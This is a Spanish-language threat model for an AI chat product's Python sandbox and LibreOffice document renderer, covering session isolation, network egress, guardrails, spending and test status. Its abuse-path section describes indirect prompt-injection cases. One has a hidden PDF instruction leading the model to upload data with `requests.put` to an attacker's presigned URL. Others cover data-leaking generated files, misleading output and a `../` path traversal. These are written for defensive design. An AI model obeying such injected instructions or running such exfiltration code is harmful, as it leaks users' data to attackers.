# Sandbox de código del chat (Code Interpreter detrás del Gateway) y render de documentos: modelo de amenazas (v0.2)

> Fecha: 2026-11-07 · v0.2 (2026-11-08): el conector construido (PR C2), ver «Estado tras C2» · v0.3 (2026-11-08): `render_document` y las skills de documentos (PR D2), ver «Estado tras D2» · Skill: `security-threat-model`. Plan: [`docs/specs/chat-capacidades-plan.md`](../../specs/chat-capacidades-plan.md) (§5, fases 2 y 3, §7). Decisiones que lo enmarcan: [D114](../../architecture/decisions/D114-code-interpreter-detras-del-gateway.md) (sandbox de código detrás del Gateway, vigente; su punto 9 recoge lo que este modelo fijó), [D115](../../architecture/decisions/D115-presupuesto-del-sandbox-de-codigo.md) (presupuesto por tiempo, vigente), [D117](../../architecture/decisions/D117-render-de-office-con-libreoffice.md) (render de Office con LibreOffice, vigente) y [D119](../../architecture/decisions/D119-skills-de-documentos-con-helpers-de-la-release.md) (skills de documentos con helpers de la release, vigente); reglas 1, 3, 4 y 5 de `AGENTS.md`; D13, D16, D25, D26, D39, D58, D73, D90, D92.
> Amplía `mango-architecture-threat-model.md` (TM-001 inyección indirecta, TM-007 aislamiento entre personas, TM-012 contenido no confiable) e `identity-propagation-threat-model.md` (identidad hasta el destino). Los archivos (subida, descarga, escaneo) están en [`chat-files-threat-model.md`](chat-files-threat-model.md) y el trabajador que corre el turno en [`turn-worker-threat-model.md`](turn-worker-threat-model.md).
> v0.1 se escribe **antes** de construir: no hay código ni recursos. La evidencia es la de la prueba del 2026-11-07 en una instalación (Code Interpreter del sistema, solo lectura, plan §2.1), los modelos de servicio de botocore y el código de `main`. Supuestos confirmados el 2026-11-07, por menú, por el agente que lanzó este trabajo (ver «Supuestos validados»).

## Executive summary

El modelo podrá ejecutar Python en un **AgentCore Code Interpreter propio de la instalación** (`Mango_<ns>_sandbox`, en modo `VPC` sin salida desde la prueba T5, **sin rol de ejecución**), al que solo llega una Lambda de Mango, `connectors/code-interpreter`, como target del Gateway. El código lo escribe el modelo y es, por definición, no confiable: puede venir dictado por un adjunto, un documento de KB o el resultado de otra tool. Los riesgos dominantes son:

1. **Cruce entre personas dentro del mismo recurso.** IAM no acota por sesión (las acciones de sesión solo admiten el ARN del Code Interpreter): el `sessionId` es la única barrera. Si llega al modelo, al navegador, a un log o a otra conversación, cualquier código o persona con él lee y escribe la sesión ajena (TM-CI1).
2. **Exfiltración desde el sandbox.** Sin credenciales, el código no tiene a quién pedir datos, pero puede sacar lo que hay en la sesión (adjuntos, resultados) por la red. La prueba T5 (2026-11-07) mostró que la red `SANDBOX` deja salir al S3 de la región; por eso el Code Interpreter va en modo `VPC`, en una red sin ninguna salida ni DNS (D114 (11)): riesgo **cerrado por diseño**, que falta ver en una instalación (TM-CI3).
3. **Inyección indirecta con ejecución.** Un adjunto o un resultado de tool pide al modelo que empaquete otros archivos, que genere un documento con un enlace o una macro, o que imprima texto que la persona tome por bueno (TM-CI4, TM-CI6).
4. **Gasto.** Cada celda cuesta tiempo de cómputo y una sesión viva cobra memoria aunque esté ociosa; un bucle del agente o muchas conversaciones agotan presupuesto y las 30 TPS de `InvokeCodeInterpreter` de la cuenta (TM-CI7).
5. **Contenido sin revisar en pantalla.** El guardrail síncrono (D39) no revisa la entrada ni el resultado de una tool; el bloque «Analizando» mostraría código y salida del modelo sin revisar. **Decidido:** pasan por `ApplyGuardrail` antes de mostrarse (TM-CI5).
6. **`render-document`:** LibreOffice abre archivos que pudo escribir el atacante (el modelo, un adjunto). Un fallo del parser no debe dar más que la propia Lambda, que no tiene red ni más permisos que su prefijo (TM-CI8).

Ninguno queda en **high** si se construyen las mitigaciones listadas con su PR. TM-CI3 pasa a **low** con el modo `VPC` sin salida (actualizado el 2026-11-07, PR C1).

## Scope and assumptions

- **Dentro:**
  - el recurso `CodeInterpreterCustom` y su red (C1);
  - el conector `connectors/code-interpreter/` con `run_python`, `list_files` y `read_file`, su registro de sesiones y la copia de salidas a S3 (C2);
  - la capacidad `code_interpreter` del agente, su firma y la reserva de presupuesto (C3);
  - lo que el trabajador manda al chat del bloque «Analizando» (C4) y el bloque en la web (W1), solo en lo que toca a contenido no confiable;
  - la hidratación de la sesión con adjuntos (U1, solo el lado del sandbox);
  - la Lambda-contenedor `render-document` (D1), las skills de documentos y sus helpers (D2) y la vuelta de los renders al modelo (D3).
- **Fuera:** la subida, el escaneo y la descarga de archivos (`chat-files-threat-model.md`); el trabajador, la cola y el stream (`turn-worker-threat-model.md`); el sandbox de UI y Canvas (V0, [`ui-sandbox-threat-model.md`](ui-sandbox-threat-model.md)); memoria (M0, [`memory-threat-model.md`](memory-threat-model.md)); la tool integrada `agentcore_code_interpreter` del harness, **descartada** por el dueño (decisión 1 del plan).
- **Supuestos:**
  1. El Code Interpreter va **sin `executionRoleArn`**: en `SANDBOX` se comprobó en el del sistema el 2026-11-07 (sin internet, metadatos con 401, sin credenciales de AWS), y la prueba T5 de ese día mostró salida al S3 de la región, por lo que el de Mango va en modo `VPC` sin salida ni DNS (D114 (11), PR C1). Que el custom sin rol se comporte igual se confirma en una instalación.
  2. Usuario sin privilegios en el sandbox, 2 vCPU, 8 GB, ~10 GB de disco; el aislamiento entre sesiones es de AWS (microVM por sesión) y está fuera del alcance de Mango.
  3. El Gateway valida el JWT; el interceptor borra el `_mango_ctx` que mande el modelo y pone el token y la firma `X-Mango-Invocation` v2 que nombra la versión del agente y sus tools (`functions/gateway-interceptor/.../handler.py`). El conector reverifica token y firma, como `knowledge-retrieve`.
  4. La persona es de confianza para sus propios datos. El atacante es quien controla contenido que el modelo lee (adjunto, documento, resultado de tool, página de un MCP remoto) o una persona autenticada que busca la sesión de otra.
  5. No se instala nada en la sesión: ni `pip` ni `npm`. Solo lo preinstalado y los helpers firmados de la release (D119), copiados con `writeFiles`.
- **Preguntas abiertas:** T5 (salida a S3 ajeno), L (tiempo máximo de una llamada del Gateway a un target Lambda: fija el corte de celda), G (si una imagen en un resultado MCP llega al modelo: D3).

## System model

### Primary components

| Componente | Qué hace | Evidencia o PR |
|---|---|---|
| Harness del agente | Llama a `code___run_python` por su `remote_mcp` al Gateway, con el token de la persona y la firma de `mango-api` | `apps/api/src/mango_api/harness.py:284` (hoy); C3 |
| Gateway + interceptor | Valida JWT, Cedar L2, borra `_mango_ctx` del modelo, pone token y firma | `functions/gateway-interceptor/` (hoy); C2 añade el target `code` |
| `connectors/code-interpreter` (Lambda) | Reverifica token y firma; busca o crea la sesión de (persona, conversación); ejecuta; copia salidas a S3; devuelve solo texto con tope; mide el uso | C2 |
| Registro de sesiones (DynamoDB) | `sessionId` cifrado con KMS, ligado a persona y conversación, con TTL | C2 |
| `Mango_<ns>_sandbox` (`CodeInterpreterCustom`) | Ejecuta el código; modo `VPC` en la VPC del sandbox (sin salida ni DNS), sin rol | C1 |
| Bucket `Mango-<ns>-chat-files` | Salidas de cada celda bajo `owner/<sub>/<conversación>/` | C1, `chat-files-threat-model.md` |
| `render-document` (Lambda-contenedor) | LibreOffice headless: archivo por id → PDF y PNG por página a S3 y a la sesión | D1 |
| Trabajador del turno | Reserva, invoca, traduce el resultado a mensajes `code.run_python` y pasa lo mostrado por `ApplyGuardrail` | C4, R2 |

### Data flows and trust boundaries

- **Modelo → harness → Gateway.** Cruza el código (argumento de la tool), no confiable. Canal: MCP sobre HTTPS con el JWT de la persona y `X-Mango-Invocation`. El guardrail no lo revisa (D39).
- **Gateway → conector.** Invocación Lambda del servicio; el interceptor añade `_mango_ctx` con el token. El conector reverifica (`iss`, `aud`, `exp`, `token_use`) y la firma (versión, tool).
- **Conector → Code Interpreter.** SigV4 con el rol de la Lambda: `Start/Invoke/StopCodeInterpreterSession` sobre el ARN exacto de `Mango_<ns>_sandbox` (sin `Get…`, que no usa). La sesión se nombra por cabecera; **no hay control de IAM por sesión**.
- **Sandbox → red.** Modo `VPC` en la VPC del sandbox: sin internet gateway, NAT, endpoints ni peering, DNS apagado y un security group sin reglas. En `SANDBOX` la prueba T5 vio salida al S3 de la región; por eso no se usa (D114 (11)).
- **Conector → S3.** `PutObject` de las salidas en `owner/<sub>/conv/<conversación>/<id>`, la clave de los adjuntos, con CMK (solo ids) y su registro `CFILE#` en `verifying` (D114 (13)); `GetObject` de adjuntos con `NO_THREATS_FOUND` para hidratar.
- **Conector → modelo.** Texto con tope (stdout, stderr, excepción, lista de archivos por id). Nunca `sessionId`, rutas internas reales ni URLs firmadas.
- **Trabajador → navegador.** Código, stdout y stderr mostrados, tras `ApplyGuardrail`; figuras y archivos solo por id.
- **`render-document`.** Recibe un id de archivo del Gateway; lee de S3 el objeto, convierte en `/tmp` y escribe el resultado. Sin red de salida más allá de S3 y KMS.

#### Diagram

```mermaid
flowchart LR
  M["Modelo"] --> H["Harness"]
  H -->|"JWT y firma"| G["Gateway e interceptor"]
  G -->|"_mango_ctx"| C["Lambda code-interpreter"]
  C -->|"SigV4 sesion por persona"| CI["Code Interpreter modo VPC sin salida ni rol"]
  C --> S3["S3 chat-files"]
  C --> D["Registro de sesiones"]
  G --> R["Lambda render-document"]
  R --> S3
  C -->|"texto con tope"| H
  W["Trabajador"] -->|"ApplyGuardrail"| B["Navegador"]
```

## Assets and security objectives

| Activo | Por qué importa | Objetivo |
|---|---|---|
| `sessionId` de cada sesión | Única barrera entre personas dentro del recurso | Confidencialidad |
| Contenido de la sesión (adjuntos, DataFrames, archivos generados) | Datos de negocio de la persona | Confidencialidad, integridad |
| Rol de la Lambda del conector | Puede invocar cualquier sesión del recurso y escribir en `owner/` | Confidencialidad |
| Presupuesto de persona y agente | Cómputo por segundo y memoria de sesiones vivas | Disponibilidad, integridad (regla 4) |
| Cuota de la cuenta (30 TPS, 1000 sesiones) | Compartida por todas las conversaciones | Disponibilidad |
| Garantía de D39 | Nada sin revisar llega a la persona | Integridad del control |
| Origen de la SPA | Un archivo o texto mostrado como marcado sería XSS | Integridad |
| Imagen de `render-document` | Código de la release que abre archivos hostiles | Integridad (D58) |

## Attacker model

### Capabilities

- Hacer que el modelo ejecute código arbitrario en la sesión (por inyección o pidiéndolo como persona).
- Poner archivos hostiles en la sesión (adjunto propio; documento de KB; salida de una tool).
- Pedir muchas celdas, celdas largas o muchas conversaciones con sesión.
- Una persona autenticada puede llamar a las rutas de Mango con su propio token.

### Non-capabilities

- No llama al Gateway sin pasar por `mango-api`: sin la firma `X-Mango-Invocation` el interceptor rechaza (hallazgo F1 de la auditoría).
- No elige la sesión: el conector la deriva del token (persona) y de la firma (conversación); el modelo no la nombra.
- No tiene credenciales de AWS dentro del sandbox (sin rol; IMDS 401, comprobado en el del sistema).
- No instala paquetes de internet (la VPC del sandbox no tiene ninguna salida).
- No escapa de la microVM del servicio (fuera de alcance; responsabilidad de AWS).

## Entry points and attack surfaces

| Superficie | Cómo se alcanza | Frontera | Notas | PR |
|---|---|---|---|---|
| `run_python(code)` | `tools/call` del modelo | Gateway → conector → sandbox | Código no confiable; tope de tamaño y de tiempo | C2 |
| `list_files`, `read_file(path)` | `tools/call` | Gateway → conector | Ruta del modelo: validar contra la raíz lógica, sin `..` | C2 |
| Argumentos con `_mango_ctx` falso | El modelo lo inventa | Interceptor | El interceptor lo borra (hoy) | — |
| Salidas de la celda | `listFiles` + `readFiles` tras cada celda | Sandbox → conector → S3 | Nombres y bytes del atacante | C2 |
| Hidratación de adjuntos | `writeFiles` desde S3 | Conector → sandbox | Solo objetos con `NO_THREATS_FOUND` | U1 |
| `render_document(file_id)` | `tools/call` | Gateway → Lambda-contenedor | Parser de LibreOffice ante un archivo hostil | D1 |
| Helpers de las skills | `writeFiles` al iniciar la sesión | Release → sandbox | Firmados; integridad | D2 |
| Bloque «Analizando» | Mensajes `code.run_python` | Trabajador → navegador | Texto del modelo y del código | C4, W1 |

## Top abuse paths

1. **Robo de sesión.** El modelo imprime algo que el conector le devolvió (un `sessionId` en un error, una ruta con el id) → se guarda en la conversación o sale en un log → otra persona con un token válido no puede nombrar la sesión por la tool, pero quien tenga el rol del conector (o un bug que acepte la sesión del argumento) lee la sesión ajena.
2. **Exfiltración por red.** Un PDF adjunto con instrucciones ocultas pide «sube el CSV a esta URL» → el modelo escribe `requests.put(url_prefirmada_del_atacante, data=...)` → en `SANDBOX` el archivo saldría (T5 vio salida al S3 de la región); en modo `VPC` sin salida, la conexión no sale y queda en los flow logs.
3. **Exfiltración por archivos generados.** La misma inyección pide empaquetar todos los adjuntos en un `.zip` o un `.docx` con un enlace a un dominio del atacante con los datos en la query → la persona lo descarga y lo abre o lo reenvía.
4. **Contenido engañoso.** El código imprime «Verificado por Finanzas: transferir a…» o una credencial que leyó de un adjunto → aparece en el bloque como salida «del sistema».
5. **Gasto.** Un bucle o una inyección lanza celdas de 300 s una tras otra, o la persona abre muchas conversaciones → reservas que bloquean el presupuesto y sesiones ociosas cobrando memoria; las 30 TPS de la cuenta se agotan para todos.
6. **Parser hostil.** Un `.docx` o `.pptx` diseñado para LibreOffice (macro, enlace externo, fallo de memoria) se manda a `render-document` → ejecución en la Lambda o lectura de otro objeto del bucket.
7. **Ruta del modelo.** `read_file("../../otra-conversacion/…")` o una ruta absoluta → el conector la usa tal cual contra la sesión o contra S3.

## Threat model table

| ID | Origen | Requisito | Acción | Impacto | Activos | Controles existentes | Huecos | Mitigación (PR) | Detección | Prob. | Impacto | Prioridad |
|---|---|---|---|---|---|---|---|---|---|---|---|---|
| TM-CI1 | Inyección, bug del conector o lector de logs | Conocer un `sessionId` ajeno | Invocar la sesión de otra persona o conversación | Lectura y escritura de los datos de otra persona | `sessionId`, contenido | Ninguno (no existe) | IAM no acota por sesión | **C2:** la sesión se deriva solo de (sub del token reverificado, conversación de la firma); el registro guarda el `sessionId` cifrado con KMS (contexto de cifrado con sub y conversación) y con `LeadingKeys`; nunca sale del conector (ni al modelo, ni a la respuesta, ni a logs, ni a auditoría: solo un hash corto); un error del servicio se reescribe a un texto propio; tests que fijan que ninguna respuesta ni log contiene el id. Nombre de sesión de AWS (`name`) sin datos de la persona | Auditoría `code.execute` con el hash de sesión, sub y conversación; alarma si un hash aparece con dos sub | Baja | Alta | **medium** |
| TM-CI2 | Persona autenticada | Su token y su conversación | Pedir al conector una conversación que no es suya | Usar la sesión ajena | Contenido | Firma `X-Mango-Invocation` v2 por sub y versión | La firma aún no nombra la conversación | **C2/C3:** la firma lleva la conversación y el turno; el conector rechaza si sub del token ≠ sub de la firma; L1 `OwnConversation` en el trabajador antes de invocar (R2) | `policy.decision` denegada | Baja | Alta | **medium** |
| TM-CI3 | Inyección indirecta | Datos en la sesión | Sacar datos por la red del sandbox (S3 de otra cuenta, URL prefirmada, DNS) | Fuga de datos de la persona fuera de la cuenta | Contenido | Sin credenciales | **T5 (2026-11-07, con el visto bueno del dueño):** desde el CI del sistema en `SANDBOX`, `s3.amazonaws.com` y `s3.us-east-1.amazonaws.com` responden (HTTP 307); S3 de otra región, STS, DynamoDB e internet, no. `SANDBOX` deja salir al S3 de la región | **C1 (cerrado por diseño):** el CI va en modo `VPC`, en una VPC propia sin internet gateway, NAT, endpoints ni peering y con el DNS apagado (`enableDnsSupport: false`, sin túnel DNS), dos subredes aisladas (solo la ruta local) y un security group sin reglas; sin rol de ejecución. Tests de infra lo fijan (`infra/test/code-sandbox.test.ts`). D114 (11), elegida la opción recomendada por el agente principal, por delegación expresa del dueño del 2026-11-07. Falta repetir T5 desde el CI de Mango en una instalación antes de integrar C2 | Flow logs `REJECT` de la VPC del sandbox en el bucket de logs de acceso | Baja | Alta | **low** (cerrado por diseño; falta verlo en una instalación) |
| TM-CI4 | Inyección indirecta | Adjuntos y resultados en la sesión | Generar archivos que filtran o dañan: zip de todo, enlaces con datos en la URL, macros, HTML o SVG | Fuga por la persona, phishing, ejecución al abrir | Contenido, la persona | Ninguno | — | **C2/D2:** lista cerrada de extensiones de salida (sin HTML, SVG, macros `.docm/.xlsm/.pptm`, ejecutables); comprobación por bytes; tarjeta con origen («generado por el agente en esta conversación»); **C5** `attachment` siempre y tipo del servidor; escaneo de malware también de los generados (`chat-files-threat-model.md`). La sesión es de una conversación: no ve archivos de otras | Auditoría `code.execute` con número, tipos y bytes de archivos | Media | Media | **medium** |
| TM-CI5 | Modelo o inyección | Salida de una celda | Mostrar código o stdout sin revisar (credenciales leídas, texto engañoso, contenido que el guardrail bloquearía) | Rompe la garantía de D39 | D39, secretos | El guardrail revisa el texto final | No revisa tools | **C4:** el trabajador pasa código, stdout y stderr que se muestran (con tope) por `ApplyGuardrail` del guardrail base antes de enviarlos; si bloquea, «Contenido retenido». Decidido por el dueño el 2026-11-07, por menú, vía el agente que lanzó este trabajo. **W1:** se pinta como texto plano en `<pre>`, nunca como Markdown ni HTML; el bloque dice que es salida del código | Métrica de bloqueos del guardrail en el bloque | Media | Media | **low** (con C4) |
| TM-CI6 | Modelo o inyección | Resultado de la tool | Devolver al modelo stdout enorme o con instrucciones | Contexto envenenado, coste de tokens | Integridad del turno, presupuesto | Inyección indirecta tratada en TM-001 | — | **C2:** respuesta al modelo solo texto, con tope (p. ej. 16 KiB) y marca de truncado; delimitada como salida no confiable; archivos por id, no por contenido | — | Alta | Baja | **medium** |
| TM-CI7 | Agente en bucle, inyección o persona | Capacidad `code_interpreter` | Agotar presupuesto, sesiones o las 30 TPS | Gasto y denegación del chat de todos | Presupuesto, cuota | D73 (reserva y liquidación), topes del turno (`maxIterations`, `timeoutSeconds`) | No hay reserva por tiempo | **C3:** `_code_reserve` = llamadas posibles × corte de celda × precio por segundo (catálogo, regla 7) + arranque; **C2:** corte propio de celda (300 s o lo que permita L), una sesión viva por conversación, `sessionTimeoutSeconds` corto (15–30 min) y `Stop` explícito; límite de sesiones por persona; uso medido por celda y liquidación; «no sé lo que costó» se retiene (D73). Backoff ante throttling y cola en el trabajador | Alarma de throttling de `InvokeCodeInterpreter`; costo por tag del recurso en el CUR | Media | Media | **medium** |
| TM-CI8 | Archivo hostil | Un id de archivo propio | Explotar LibreOffice en `render-document` (macro, enlace externo, fallo del parser) | Ejecución en la Lambda; leer otros objetos del bucket | Bucket, rol de la Lambda | — | — | **D1:** macros desactivadas y enlaces externos apagados en el perfil; perfil nuevo por invocación en `/tmp`; sin red de salida salvo S3/KMS (Lambda fuera de la VPC: no hay control de salida, ver residual); rol que solo lee el objeto pedido (prefijo del dueño y de la conversación, que vienen de la firma, no del modelo) y escribe su resultado; tiempo y memoria acotados; solo tipos de la lista; imagen construida y firmada en la release (D58), con escaneo de vulnerabilidades en el CI | Errores y tiempos de la Lambda; alarma de fallos | Baja | Media | **low** |
| TM-CI9 | Modelo | `read_file`/`list_files` con ruta | Recorrer fuera de la raíz lógica o pedir objetos de S3 de otra conversación | Leer archivos internos o ajenos | Contenido | — | — | **C2:** las rutas se normalizan y se validan contra la raíz lógica (`/mnt/data`), sin `..`, absolutas ni control (reglas de §2.3 del plan); S3 solo con claves que construye el conector desde sub y conversación de la firma | Rechazos auditados | Media | Media | **low** |
| TM-CI10 | Cambio futuro | Configuración del recurso | Añadir un rol de ejecución o red `PUBLIC` | Credenciales al alcance del código; internet | Rol, contenido | — | — | **C1:** test de infraestructura que fija `SANDBOX` y la ausencia de `ExecutionRoleArn`; el boundary de agentes sigue sin acciones de Code Interpreter (no la usa el harness); solo el rol del conector tiene `*CodeInterpreterSession`, sobre el ARN exacto | cdk-nag, cfn-guard, test | Baja | Alta | **low** |
| TM-CI11 | Lector de logs | Logs de la Lambda o trazas | Ver código, salidas o datos | Contenido en logs operativos (D16) | Contenido | D16: sin contenido en logs | — | **C2:** la Lambda no registra argumentos, código, stdout ni nombres de archivo; auditoría `code.execute` solo con duración, estado, conteos y bytes; el contenido vive solo en `Conversations` o S3 con CMK | Revisión del logger en tests | Baja | Media | **low** |
| TM-CI12 | Release comprometida o helper alterado | Helpers de skills | Código distinto al revisado en cada sesión | Integridad del resultado | Integridad | Firma de la release (D36, D58) | — | **D2:** helpers en el artefacto firmado; el conector comprueba sha256 antes de `writeFiles`; nombres de módulo no registrables en PyPI | Fallo de hash auditado | Baja | Media | **low** |

## Criticality calibration

- **high:** acceso a la sesión o a los archivos de otra persona; credenciales de AWS al alcance del código; salida a internet confirmada sin control.
- **medium:** exfiltración posible pero no probada; archivos generados peligrosos sin escaneo; gasto sin tope; contenido sin revisar de forma sistemática.
- **low:** fallos acotados por el rol de una Lambda, rutas rechazadas, contenido ya revisado.

## Focus paths for security review

| Ruta (cuando exista) | Por qué | Amenazas |
|---|---|---|
| `connectors/code-interpreter/` | Derivación de sesión, cifrado del `sessionId`, rutas, topes | TM-CI1, CI2, CI6, CI9, CI11 |
| `infra/lib/constructs/` del Code Interpreter y `tools.ts` | Red, rol, permisos del conector, política Cedar L2 | TM-CI3, CI10 |
| `functions/gateway-interceptor/` | Firma con conversación y turno | TM-CI2 |
| `apps/api/src/mango_api/` (reserva, trabajador) | `_code_reserve`, `ApplyGuardrail` | TM-CI5, CI7 |
| `functions/render-document/` (D1) y su Dockerfile | Perfil de LibreOffice, rol | TM-CI8 |
| `apps/web/src/components/chat/` (bloque) | Texto plano, sin Markdown | TM-CI5 |

## Supuestos validados

Confirmados el 2026-11-07, por menú, por el agente que lanzó este trabajo:

- Lo que el bloque «Analizando» muestra (código, stdout, stderr) pasa por `ApplyGuardrail` antes de enviarse («ApplyGuardrail a lo mostrado (Recomendada)»).
- La salida por la red `SANDBOX` quedaba abierta hasta la prueba T5 de C1; C2 no se integra si T5 muestra salida sin una mitigación que decida el dueño («T5 bloquea C2 (Recomendada)»). T5 mostró salida al S3 de la región; la mitigación, el modo `VPC` sin salida ni DNS, la eligió el agente principal con la opción recomendada, por delegación expresa del dueño del 2026-11-07 (D114 (11)).
- Al borrar una conversación (cuando exista esa ruta) o dar de baja a una persona, se para su sesión del Code Interpreter y se borra su registro («Borrar con la conversación (Recomendada)»).

## Estado tras C2 (2026-11-08)

El conector está construido (PR C2; D114 (13), D115 (7)), sin ver en una instalación. Lo que cierra cada amenaza y el test que lo fija (`connectors/code-interpreter/tests/test_handler.py`, con un Code Interpreter falso que ejecuta las celdas de verdad; `infra/test/code-connector.test.ts`; `functions/gateway-interceptor/tests/test_interceptor.py`; `packages/py/mango-core/tests/test_invocation.py`):

- **TM-CI1.** La sesión se busca solo por (sub del token reverificado, conversación de la firma), en la partición de la persona (`Conversations`, `LeadingKeys` por política de sesión). El `sessionId` se sella con la llave de datos de `Core` y `purpose = code-session`, la persona y la conversación como contexto de cifrado: copiado a otra partición o a otra conversación no abre (test). El rol del conector solo usa la llave directamente con ese propósito; `mango-api` también podría descifrar con ella, pero no tiene ningún permiso sobre el Code Interpreter, así que el id no le sirve (no se usó una llave propia: sería un recurso con datos en un stack anidado, D99 (2)). Ninguna respuesta, log, auditoría ni fila (salvo el sellado) contiene el id: un test lo busca en todo lo que sale; la auditoría lleva un hash corto. El nombre de la sesión de AWS es aleatorio. Los errores del servicio se reescriben (test). **Pendiente:** la alarma «un hash con dos sub» del detector no se construyó: el hash va en `code.execute` para buscarlo.
- **TM-CI2.** La firma lleva `conv` y `turn` solo en las versiones con `code_interpreter`; el interceptor rechaza una tool `code` sin ellos y pisa lo que el modelo ponga en `_mango_ctx`; el conector rechaza un token cuyo `sub` no es el de la firma (tests).
- **TM-CI4.** La lista cerrada de los archivos del chat (`mango_core.chat_files.TYPES`), comprobada por sus bytes (firma de PNG/JPEG/PDF, UTF-8 y JSON válido para el texto, un Office con `[Content_Types].xml` y sin `vbaProject.bin`); HTML, SVG, scripts, `.xlsm` y ejecutables no salen y el modelo lo sabe (tests). Las claves son solo ids. Los generados los escanea GuardDuty como cualquier objeto del bucket, sin etiqueta del conector (D116 (10)).
- **TM-CI6.** Al modelo, un único `{"text": …}` con la marca de salida no confiable, stdout 8.000, stderr 4.000 y un total de 16.000 caracteres con «[truncated]» (test); los archivos, por id.
- **TM-CI7.** `_code_reserve` antes del turno (chat, tareas, Playground y evals), con los precios de la configuración; corte propio de 300 s por `SIGALRM` y, si la celda no vuelve, el tiempo de lectura del cliente para y olvida la sesión (tests); vida de 30 minutos y `Stop` de la sesión vencida al abrir la nueva; una celda a la vez por conversación; 30 llamadas por minuto, 20 sesiones nuevas por hora y 8 celdas por turno por persona; lo medido se liquida, también en un turno retenido, y una celda sin final cuenta su corte (tests de `mango-api` y de `mango-core`). Throttling → métrica `CodeInterpreterThrottles` y «busy» (test). **Pendiente:** la alarma sobre esa métrica.
- **TM-CI9.** Las rutas de `read_file` se decodifican hasta un punto fijo y se rechazan las absolutas fuera de `/mnt/data`, `..`, los nombres con punto inicial (Mango guarda lo suyo en `.mango/`), las barras invertidas y los caracteres de control (tests). S3 solo con claves que el conector construye.
- **TM-CI10.** El rol del conector solo tiene las tres acciones de sesión sobre el ARN exacto; ningún otro statement nombra el servicio; ningún recurso `*` salvo X-Ray (test de infra).
- **TM-CI11.** El conector registra solo ids, conteos y el resultado; nunca código, salida ni nombres de archivo (test sobre los logs del propio conector). `code.execute` lleva duración, estado, conteos, tipos y bytes.

Los adjuntos entran en la sesión solo si su registro dice `ready` y el bucket abre el objeto (TBAC); el nombre se limpia (test). Siguen abiertas: la prueba L, la repetición de T5 desde el Code Interpreter de Mango (bloquea integrar C2), si `readFiles` acepta rutas absolutas y si `/mnt/data` se puede crear, y TM-CI5, que es de C4.

## Estado tras D2 (2026-11-08)

`render_document` y las skills de documentos están construidos (PR D2; D119 (5) a (9), D117 (9)), sin ver en una instalación. Tests: `connectors/code-interpreter/tests/test_handler.py` (render), `test_mango_docs.py`, `packages/py/mango-core/tests/test_document_skills.py`, `functions/provisioner/tests/` (fuentes, rol y escritura), `infra/test/render-document.test.ts`, `code-connector.test.ts` y `provisioner.test.ts`.

- **TM-CI8.** Las claves de la función las arma el conector desde el `sub` del token reverificado y la conversación de la firma; el modelo solo nombra un archivo de su propia conversación (por id o nombre, buscado en la partición de la persona: el de otra persona u otra conversación no existe para él, test). El conector espera a que el bucket abra el archivo (escaneo limpio) antes de invocar, y de la respuesta solo acepta claves bajo el prefijo que eligió él (test). Solo `.docx`, `.xlsx` y `.pptx`. La función acepta ahora solo el formato de claves de U1 (D117 (9)). Solo el rol del conector tiene `lambda:InvokeFunction` sobre ella, sin permiso de recurso (test sobre todas las plantillas de una release).
- **TM-CI6.** Las páginas vuelven a la sesión, no al modelo: el modelo recibe texto (estado, páginas, carpeta) con la marca de salida no confiable, y los informes de `mango_docs` citan como mucho 30 caracteres del documento.
- **TM-CI7.** Un render cuenta como una de las 8 celdas del turno y se cobra por sus segundos al precio de CPU del sandbox, que supera el de la función; comparte el límite de 30 llamadas por minuto (tests).
- **TM-CI4.** Las páginas van a `.renders/`, carpeta oculta: ninguna celda las entrega a la persona (test). Las skills solo piden entregar tipos de la lista cerrada (test sobre sus textos).
- **TM-CI12.** `mango_docs.py` viaja en el zip firmado del conector; su SHA-256 está fijado en `handler.py` y un test lo compara con el archivo, así que cambiar los helpers obliga a cambiar esa línea en la revisión. Un archivo que no coincide nunca se escribe en la sesión: la sesión sigue sin helpers y la métrica `DocsHelperMismatch` lo cuenta (test). `mango_docs` y `_mango` no son nombres que puedan venir de PyPI, y el sandbox no tiene `pip`.
- **Skills de la release.** Sus textos están en el repositorio y en el zip de las Lambdas; el provisioner los escribe con `If-None-Match` en `skills/_release/<id>/<digest>/`, donde ningún creador puede escribir (sus ids no pueden ser `_release`) y nada se pisa. El permiso de escritura está en la política del bucket de skills y en la de su llave, solo para el rol del provisioner y solo sobre ese prefijo (test). Sus ids están reservados para que ninguna skill de un creador las suplante en un harness (test).

Siguen abiertas: si una imagen en el resultado MCP llega al modelo (D3), y probar en una instalación que el escaneo de GuardDuty libera las páginas a tiempo (60 s y 90 s) y que `writeFiles` acepta rutas absolutas.

## Riesgos residuales

Siete residuales de los tres modelos (TM-CI1, CI3 y CI8; TM-CF3 y CF5; TM-TW1 y TW5) los aceptó el dueño el 2026-11-07, por menú, con la opción «Aceptar los siete (Recomendada)». Cada uno lo dice abajo.

- **TM-CI3:** T5 (2026-11-07) mostró que la red `SANDBOX` deja salir al S3 de la región. El Code Interpreter va en modo `VPC` sin salida ni DNS, que precisa D15 (D114 (11)). Queda verlo en una instalación: repetir T5 desde el Code Interpreter de Mango antes de integrar C2. **Aceptado por el dueño el 2026-11-07, por menú: «Aceptar los siete (Recomendada)».**
- **TM-CI1:** el `sessionId` sigue siendo la única barrera dentro del recurso; quien controle el rol del conector puede leer cualquier sesión viva (como el rol de `mango-api` puede leer cualquier conversación hoy). **Aceptado por el dueño el 2026-11-07, por menú: «Aceptar los siete (Recomendada)».**
- **TM-CI8:** `render-document` va fuera de la VPC (excepción `LAMBDA_INSIDE_VPC`): no hay control de salida de red si LibreOffice se explotara; lo acota que su rol no tenga más que su objeto. **Aceptado por el dueño el 2026-11-07, por menú: «Aceptar los siete (Recomendada)».**
  - **Al construirlo (PR D1, 2026-11-07):** el rol lee `owner/*` y escribe solo `owner/*/renders/*`. IAM no puede acotarlo al objeto de cada llamada: la función comprueba que entrada y salida sean del mismo dueño y conversación, y el bucket niega lo que el escaneo no limpió (D116 (10)). LibreOffice corre sin las credenciales de la función en su entorno, pero en el mismo usuario: un fallo que diera ejecución de código podría leerlas del proceso padre (`/proc`) y usarlas con ese rol mientras duren. Es el mismo alcance que acepta este residual. Las mitigaciones de la fila construidas son: macros apagadas, enlaces sin actualizar, proxy muerto para la red de LibreOffice, tipo por los bytes (sin macros, VBA ni ActiveX), topes de tamaño y tiempo, carpeta de trabajo borrada en cada llamada, imagen de la release por digest con escaneo al subir al ECR (`imageScanOnPush`).
